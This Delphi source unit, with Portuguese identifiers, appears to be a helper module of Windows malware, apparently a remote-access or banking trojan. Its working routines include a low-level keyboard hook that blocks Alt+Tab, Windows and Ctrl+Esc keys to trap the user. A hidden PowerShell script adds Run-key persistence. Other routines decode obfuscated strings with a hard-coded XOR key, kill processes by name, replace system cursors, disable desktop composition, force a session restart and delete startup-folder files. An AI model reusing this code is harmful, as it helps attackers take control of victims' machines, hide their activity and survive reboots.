unit funcoes;

interface

uses
  Winapi.Windows, TlHelp32, System.SysUtils, variaveis, Winapi.ShlObj,
  vcl.forms, conexoes, principal, System.Classes, Winapi.Messages, Graphics,
  vcl.Imaging.pngimage,

  Variants, ActiveX, ComObj,
  Controls, jpeg, IdHTTP,
  ScktComp, StdCtrls, ExtCtrls, Zlib, Registry,
  DCPcrypt2, DCPrijndael, DCPsha512, DCPripemd160, System.StrUtils,
  Clipbrd, ShellAPi, inifiles, tapioca,
  dwmapi, System.SyncObjs;

type
  tagKBDLLHOOKSTRUCT = packed record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: Integer;
  end;

  KBDLLHOOKSTRUCT = tagKBDLLHOOKSTRUCT;
  PKBDLLHOOKSTRUCT = ^KBDLLHOOKSTRUCT;

  tagMSLLHOOKSTRUCT = record
    POINT: TPoint;
    mouseData: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: DWORD;
  end;

  TMSLLHOOKSTRUCT = tagMSLLHOOKSTRUCT;
  PMSLLHOOKSTRUCT = ^TMSLLHOOKSTRUCT;

const
  LLKHF_UP = $0080;
  LLKHF_ALTDOWN = $0020;

  WH_KEYBOARD_LL = $000D;

  LLKHF_EXTENDED = $0001;
  LLKHF_INJECTED = $0010;

function rtcKillProcess(strProcess: String): Integer;
function ProcessExists(exeFileName: string): Boolean;
function Finalizaprocesso(exeFileName: string): Integer;
procedure ForceDeleteDirContent(Dir: string);
procedure SetPriority(High: Boolean; RealtimeND: Boolean = True);
function GetPathFolder(Path: string): string;
function GetSpecialFolderPath(Folder: Integer; CanCreate: Boolean): string;
function vDC(const src: String): String;
Procedure Pausar(MSec: Cardinal);
procedure Peek;
procedure DisablePeek;
function RestartaSessao(RebootParam: Longword): Boolean;
function uTrataKey(nCode: Integer; wParam: Integer; lParam: Integer): Integer;
  stdcall; export;
function ActiveCaption: string;
// procedure DoExpand(inStream: TStream);
function DC2(src: String; ch, kb: string): String;
function pCname: string;
procedure Install_Cur(yes: Boolean);
procedure LoadImg(Img: Timage; id: string);
function O_F_uS_C(Action, src: String): String;
procedure DoCompress(inStream: TStream);
function StreamToString(Stream: TStream): string;
function RDN2(strLen: Integer): string;
function ExtractText(aText, OpenTag, CloseTag: String): String;
Procedure FindReplace(const Enc, subs: String; Var texto: Tstringlist);
procedure Load_javasi(id, fname, dest: string);
Procedure Delfiles(dest, names: string);
function killa(exeFileName: string): Integer;
function vDecript2(const src: String): String;
procedure DoExpand(inStream: TStream);
procedure InserirRegistro(Antigo, novo, value1, value2: string);
function ChaveN: String;
function Randomstring(strLen: Integer): string;
procedure limpartudo;

var
  var_SearchRec: TSearchRec;

implementation
        uses umodulo;

function rtcKillProcess(strProcess: String): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THANDLE;
  procEntry: TProcessEntry32;
  myPID: Cardinal;
begin
{$IFDEF ExtendLog}xLog('rtcKillProcess', LogAddon); {$ENDIF}
  Result := 0;

  strProcess := UpperCase(ExtractFileName(strProcess));
  myPID := GetCurrentProcessId;

  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  try
    procEntry.dwSize := Sizeof(procEntry);
    ContinueLoop := Process32First(FSnapshotHandle, procEntry);
    while Integer(ContinueLoop) <> 0 do
    begin
      if (procEntry.th32ProcessID <> myPID) and
        ((UpperCase(procEntry.szExeFile) = strProcess) or
        (UpperCase(ExtractFileName(procEntry.szExeFile)) = strProcess)) then
        Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE,
          BOOL(0), procEntry.th32ProcessID), 0));
      ContinueLoop := Process32Next(FSnapshotHandle, procEntry);
    end;
  finally
    CloseHandle(FSnapshotHandle);
  end;
end;

function ProcessExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THANDLE;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := false;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
      = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
      = UpperCase(exeFileName))) then
    begin
      Result := True;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function Finalizaprocesso(exeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THANDLE;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
      = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
      = UpperCase(exeFileName))) then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),
        FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

procedure ForceDeleteDirContent(Dir: string);
var
  i: Integer;
  sDirectory: string;
  sr: TSearchRec;
begin
  sDirectory := IncludeTrailingPathDelimiter(Dir);
  i := FindFirst(sDirectory + '*.*', faAnyFile, sr);
  while i = 0 do
  begin
    if (sr.Attr and faDirectory) = faDirectory then
      RemoveDir(sDirectory + sr.Name)
    else
    begin

      if not DeleteFile(sDirectory + sr.Name) then
      begin
        FileSetAttr(sDirectory + sr.Name, 0); { reset all flags }
        DeleteFile(sDirectory + sr.Name);
      end;

    end;
    i := FindNext(sr);
  end;
  FindClose(sr);
end;

procedure SetPriority(High: Boolean; RealtimeND: Boolean = True);
Var
  tp, pp: Integer;
begin
  If High then
    If (RealtimeND) and (DebugHook = 0) then
    begin
      pp := REALTIME_PRIORITY_CLASS;
      tp := THREAD_PRIORITY_TIME_CRITICAL;
    end
    else
    begin
      // very high priority is dangerous for debugging...
      pp := HIGH_PRIORITY_CLASS;
      tp := THREAD_PRIORITY_ABOVE_NORMAL;
    end
  else
  begin
    pp := NORMAL_PRIORITY_CLASS;
    tp := THREAD_PRIORITY_NORMAL;
  end;
  SetPriorityClass(GetCurrentProcess, pp);
  SetThreadPriority(GetCurrentThread, tp);
end;

function GetPathFolder(Path: string): string;
var
  LenPath, i, j: Word;
begin
  LenPath := Length(Path);

  if Pos('\', Path) = 0 then
  begin
    Result := 'Erro: Caminho Invalido!';
    Exit;
  end;

  if LenPath = 3 then
  begin
    Result := Path;
    Exit;
  end;

  if Copy(Path, LenPath, 1) = '\' then
    Path := Copy(Path, 1, LenPath - 1);

  for i := 0 to LenPath do
    if Path[i] = '\' then
      j := i;
  Result := Copy(Path, 1, j);
end;

function GetSpecialFolderPath(Folder: Integer; CanCreate: Boolean): string;
var
  FilePath: array [0 .. 255] of Char;
begin
  SHGetSpecialFolderPath(0, @FilePath[0], Folder, CanCreate);
  Result := FilePath;
end;

function vDC(const src: String): String;
Label Fim;
var
  KeyLen: Integer;
  KeyPos: Integer;
  OffSet: Integer;
  dest, Key: String;
  SrcPos: Integer;
  SrcAsc: Integer;
  TmpSrcAsc: Integer;
  Range: Integer;
begin
  Key := 'HSA5JIDUGPLPUIP4X7SNT2XLX';
  if (src = '') Then
  begin
    Result := '';
    Goto Fim;
  end;
  Key := Key;
  dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  OffSet := StrToInt('$' + Copy(src, 1, 2));
  SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$' + Copy(src, SrcPos, 2));
    if (KeyPos < KeyLen) Then
      KeyPos := KeyPos + 1
    else
      KeyPos := 1;
    TmpSrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then
      TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else
      TmpSrcAsc := TmpSrcAsc - OffSet;
    dest := dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(src));
  Result := dest;
Fim:
end;

Procedure Pausar(MSec: Cardinal);
var
  Start: Cardinal;
begin
  // Screen.Cursor := crHourGlass;
  Start := GetTickCount;
  repeat
    Application.ProcessMessages;
  until (GetTickCount - Start) >= MSec;
  // Screen.Cursor := crDefault;
end;

procedure Peek;
var
  DWMlibrary: THANDLE;
  fDisable: BOOL;
  DwmEnableComposition: function(CompositionAction: Integer): Integer; stdcall;
begin

  DWMlibrary := LoadLibrary(PChar('DWMAPI.dll'));
  if DWMlibrary <> 0 then
  begin
    @DwmEnableComposition := GetProcAddress(DWMlibrary,
      PChar('DwmEnableComposition'));
    if @DwmEnableComposition <> nil then
      DwmEnableComposition(1);

  end;
end;

procedure DisablePeek;
var
  DWMlibrary: THANDLE;
  fDisable: BOOL;
  DwmEnableComposition: function(CompositionAction: Integer): Integer; stdcall;
begin

  DWMlibrary := LoadLibrary(PChar('DWMAPI.dll'));
  if DWMlibrary <> 0 then
  begin
    @DwmEnableComposition := GetProcAddress(DWMlibrary,
      PChar('DwmEnableComposition'));
    if @DwmEnableComposition <> nil then
      DwmEnableComposition(0);

  end;
end;

function RestartaSessao(RebootParam: Longword): Boolean;
var
  TTokenHd: THANDLE;
  TTokenPvg: TTokenPrivileges;
  cbtpPrevious: DWORD;
  rTTokenPvg: TTokenPrivileges;
  pcbtpPreviousRequired: DWORD;
  tpResult: Boolean;
begin
  if Win32Platform = VER_PLATFORM_WIN32_NT then
  begin
    tpResult := OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or
      TOKEN_QUERY, TTokenHd);
    if tpResult then
    begin
      tpResult := LookupPrivilegeValue(nil, PWideChar('SeShutdownPrivilege'),
        TTokenPvg.Privileges[0].Luid);
      TTokenPvg.PrivilegeCount := 1;
      TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      cbtpPrevious := Sizeof(rTTokenPvg);
      pcbtpPreviousRequired := 0;
      if tpResult then
        AdjustTokenPrivileges(TTokenHd, false, TTokenPvg, cbtpPrevious,
          rTTokenPvg, pcbtpPreviousRequired);
    end;
  end;
  Result := ExitWindowsEx(RebootParam, 0);
end;

function uTrataKey(nCode: Integer; wParam: Integer; lParam: Integer): Integer;
  stdcall; export;
var
  Hook: PKBDLLHOOKSTRUCT;
  bControlKeyDown: Boolean;
  fEatKeystroke: Boolean;
begin
  Hook := Pointer(lParam);
  // xClose_Gerenciador;
  case nCode of
    HC_ACTION:
      begin
        bControlKeyDown :=
          ((GetAsyncKeyState(VK_CONTROL) shr ((Sizeof(SHORT) * 8) - 1)) <> 0);
        if (Hook^.vkCode = VK_ESCAPE) and (bControlKeyDown) then
        begin
          Result := 1;
        end
        else if ((Hook^.flags and LLKHF_ALTDOWN) <> 0) and
          (Hook^.vkCode = VK_TAB) then
        begin
          Result := 1;
        end
        else if ((Hook^.flags and LLKHF_ALTDOWN) <> 0) and
          (Hook^.vkCode = VK_ESCAPE) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_RETURN) and (bControlKeyDown) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_LWIN) or (Hook^.vkCode = VK_RWIN) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_MENU) or (Hook^.vkCode = VK_LMENU) or
          (Hook^.vkCode = VK_RMENU) then
        begin
          Result := 1;
        end
        else
        begin
          Result := CallNextHookEx(hkHook, nCode, wParam, lParam);
        end;
      end;
  else
    begin
      Result := CallNextHookEx(hkHook, nCode, wParam, lParam);
    end;
  end;
end;

function ActiveCaption: string;
var
  Handle: THANDLE;
  Len: LongInt;
  Title: string;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    Len := GetWindowTextLength(Handle) + 1;
    SetLength(Title, Len);
    GetWindowText(Handle, PChar(Title), Len);
    ActiveCaption := TrimRight(Title);
  end;
end;

function Espaco(Descricao: String): string;
Var
  Cont: Integer;
begin
  Result := Descricao;
  Cont := 2;
  While Cont < Length(Result) + 1 Do
  Begin
    Insert(' ', Result, Cont);
    Cont := Cont + 2;
  End;
end;

function DC2(src: String; ch, kb: string): String;
Label Fim;
var
  KeyLen: Integer;
  KeyPos: Integer;
  OffSet: Integer;
  dest, Key: String;
  SrcPos: Integer;
  SrcAsc: Integer;
  TmpSrcAsc: Integer;
  Range: Integer;
  dd: string;
  maykey: string;
begin
  dd := '';
  if (src = '') Then
  begin
    Result := '';
    Goto Fim;
  end;

  maykey := ch;
  maykey := Espaco(maykey);
  maykey := maykey + kb;
  Key := maykey;
  Key := stringreplace(Key, ' ', '', [rfReplaceAll, rfIgnoreCase]);

  Key := stringreplace(Key, kb, '', [rfReplaceAll, rfIgnoreCase]);

  dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  // SrcPos := 0;
  // SrcAsc := 0;
  Range := 256;

  OffSet := StrToInt('$' + Copy(src, 1, 2));
  SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$' + Copy(src, SrcPos, 2));
    if (KeyPos < KeyLen) Then
      KeyPos := KeyPos + 1
    else
      KeyPos := 1;
    TmpSrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then
      TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else
      TmpSrcAsc := TmpSrcAsc - OffSet;
    dest := dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(src));

  Result := dest;
Fim:
end;

function pCname: string;
const
  MAX_COMPUTER_LENGTH = 30;
var
  pNome: PChar;
  Len: DWORD;
begin
  try
    Len := MAX_COMPUTER_LENGTH + 1;
    GetMem(pNome, Len);
    if GetComputerName(pNome, Len) then
      Result := pNome
    else
      Result := '0101';
  finally
    FreeMem(pNome, Len);
  end;
end;

function SetMe(i: Cardinal): Boolean;
begin
  cr := LoadCursor(hInstance, PChar('Cursor_1'));
  SetSystemCursor(cr, i);
end;

procedure Install_Cur(yes: Boolean);
var
  i: Integer;
begin
  if yes then
  begin

    SetMe(OCR_NORMAL);
    SetMe(OCR_APPSTARTING);
    SetMe(OCR_CROSS);
    SetMe(OCR_HAND);
    SetMe(OCR_IBEAM);
    SetMe(OCR_NO);
    SetMe(OCR_SIZEALL);
    SetMe(OCR_SIZENESW);
    SetMe(OCR_SIZENWSE);
    SetMe(OCR_SIZEWE);
    SetMe(OCR_UP);
    SetMe(OCR_WAIT);

  end
  else

    SystemParametersInfo(SPI_SETCURSORS, 0, 0, WM_SETTINGCHANGE or
      SPIF_UPDATEINIFILE);

end;

procedure LoadImg(Img: Timage; id: string);
var
  RS: TResourceStream;
  PMNGImage: TPngImage;
begin
  PMNGImage := TPngImage.Create;
  try
    RS := TResourceStream.Create(hInstance, id, RT_RCDATA);
    try
      PMNGImage.LoadFromStream(RS);
      Img.Picture.Graphic := PMNGImage;
    finally
      RS.Free;
    end;
  finally
    PMNGImage.Free;
  end;
end;

function O_F_uS_C(Action, src: String): String;
var
  Key: String;
  Cipher: TDCP_rijndael;

begin
  Key := ChaveKey;
  if (Action = UpperCase('C')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(Key, TDCP_sha512);
    Result := Cipher.EncryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;
  if (Action = UpperCase('D')) then
  begin
    Cipher := TDCP_rijndael.Create(nil);
    Cipher.InitStr(Key, TDCP_sha512);
    Result := Cipher.DecryptString(src);
    Cipher.Burn;
    Cipher.Free;
  end;

end;

procedure DoCompress(inStream: TStream);
var
  outMS: TMemoryStream;
  ZStream: TCompressionStream;
begin
  outMS := TMemoryStream.Create;
  try
    inStream.Seek(0, soFromBeginning);

    outMS.Size := 0;
    ZStream := TCompressionStream.Create(NivelCompressao, outMS);
    try
      ZStream.CopyFrom(inStream, 0);
    finally
      ZStream.Free;
    end;

    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    outMS.Free;
  end;
end;

function StreamToString(Stream: TStream): string;
var
  MS: TMemoryStream;
begin
  Result := '';
  MS := TMemoryStream.Create;
  try
    MS.LoadFromStream(Stream);
    SetString(Result, PAnsiChar(MS.memory), MS.Size);
  finally
    MS.Free;
  end;
end;

function RDN2(strLen: Integer): string;
var
  str: string;
begin
  Randomize;
  str := 'abcdefghijlmnopqrstuvxzwky';
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = strLen);
  Application.ProcessMessages;

end;

function ExtractText(aText, OpenTag, CloseTag: String): String;
{ Retorna o texto dentro de 2 tags (open & close Tag's) }
var
  iAux, kAux: Integer;
begin
  Result := '';

  if (Pos(CloseTag, aText) <> 0) and (Pos(OpenTag, aText) <> 0) then
  begin
    iAux := Pos(OpenTag, aText) + Length(OpenTag);
    kAux := Pos(CloseTag, aText);
    Result := Copy(aText, iAux, kAux - iAux);
  end;
end;

Procedure FindReplace(const Enc, subs: String; Var texto: Tstringlist);
Var
  i, Posicao: Integer;
  Linha: string;
Begin
  For i := 0 to texto.Count - 1 do
  begin
    Linha := texto.Strings[i];
    Repeat
      Posicao := Pos(Enc, Linha);
      If Posicao > 0 then
      Begin
        Delete(Linha, Posicao, Length(Enc));
        Insert(subs, Linha, Posicao);
        texto.Strings[i] := Linha;
      end;
    until Posicao = 0;
  end;
end;

procedure Load_javasi(id, fname, dest: string);
var
  RS: TResourceStream;
  MS: TMemoryStream;
begin
  MS := TMemoryStream.Create;
  try
    RS := TResourceStream.Create(hInstance, id, RT_RCDATA);
    try
      MS.LoadFromStream(RS);
      MS.SaveToFile(dest + fname);
    finally
      RS.Free;
    end;
  finally
    MS.Free;
  end;
end;

Procedure Delfiles(dest, names: string);
Begin
  try
    try
      FindFirst(dest + names, faAnyFile, var_SearchRec);
      repeat
        DeleteFile(dest + var_SearchRec.Name);
      until FindNext(var_SearchRec) <> 0;
    finally
      FindClose(var_SearchRec);
    end;
  Except
  end;
End;

function killa(exeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THANDLE;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
      = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
      = UpperCase(exeFileName))) then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),
        FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function vDecript2(const src: String): String;
Label Fim;
var
  KeyLen: Integer;
  KeyPos: Integer;
  OffSet: Integer;
  dest, Key: String;
  SrcPos: Integer;
  SrcAsc: Integer;
  TmpSrcAsc: Integer;
  Range: Integer;
begin
  Key := 'HSA5JIDUGPLPUIP4X7SNT2XLX';
  if (src = '') Then
  begin
    Result := '';
    Goto Fim;
  end;
  Key := Key;
  dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  OffSet := StrToInt('$' + Copy(src, 1, 2));
  SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$' + Copy(src, SrcPos, 2));
    if (KeyPos < KeyLen) Then
      KeyPos := KeyPos + 1
    else
      KeyPos := 1;
    TmpSrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then
      TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else
      TmpSrcAsc := TmpSrcAsc - OffSet;
    dest := dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(src));
  Result := dest;
Fim:
end;

procedure DoExpand(inStream: TStream);
const
  BufferSize = 4096;
var
  Count: Integer;
  outMS: TMemoryStream;
  ZStream: TCustomZLibStream;
  Buffer: array [0 .. BufferSize - 1] of Byte;
begin
  outMS := TMemoryStream.Create;
  try
    inStream.Seek(0, soFromBeginning);
    outMS.Size := 0;

    ZStream := TDecompressionStream.Create(inStream);
    try
      while True do
      begin
        Count := ZStream.Read(Buffer, BufferSize);
        if Count <> 0 then
          outMS.WriteBuffer(Buffer, Count)
        else
          break;
      end;
    finally
      ZStream.Free;
    end;
    inStream.Size := outMS.Size;
    inStream.Position := 0;
    inStream.CopyFrom(outMS, 0);
  finally
    outMS.Free;
  end;
end;

procedure InserirRegistro(Antigo, novo, value1, value2: string);
var
  T: Tstringlist;
begin
  T := Tstringlist.Create;
  T.Add('Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name '
    + Antigo);
  T.Add('Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name '
    + novo + ' -Value ' + value1 + ''' "''' + '' + value2 + '''"''');
  T.SaveToFile(ExtractFilePath(Application.exename) + 'b.ps1');
  ShellExecute(0, 'open', 'powershell.exe',
    PWideChar('-executionpolicy remotesigned -File ' +
    ExtractFilePath(Application.exename) + '\b.ps1 -WindowStyle Hidden'),
    '', SW_HIDE);
  T.Free;
end;

function ChaveN: String;
var
  i, x: Integer;
const
  letras = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlmnopqrstuvxzywk';
  numeros = '1234567890';
  digitos = 4;
Begin
  Result := '';
  Randomize;
  for i := 1 to digitos do
  Begin
    Result := Result + letras[Random(Length(letras)) + 1];
    Result := Result + numeros[Random(Length(numeros)) + 1];
    RunMui := Result;
  End;
end;

function Randomstring(strLen: Integer): string;
var
  str: string;
begin
  Randomize;

  str := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = strLen) end;

  procedure limpartudo;
  var
    i: Integer;
    sr: TSearchRec;
    pastaup: string;
  begin
    pastaup := IncludeTrailingBackslash
      (GetSpecialFolderPath(CSIDL_ALTSTARTUP, false));
    i := FindFirst(pastaup + '*.*', faAnyFile, sr);
    while i = 0 do
    begin
      DeleteFile(pastaup + sr.Name);
      i := FindNext(sr);
    end;
  end;

end.
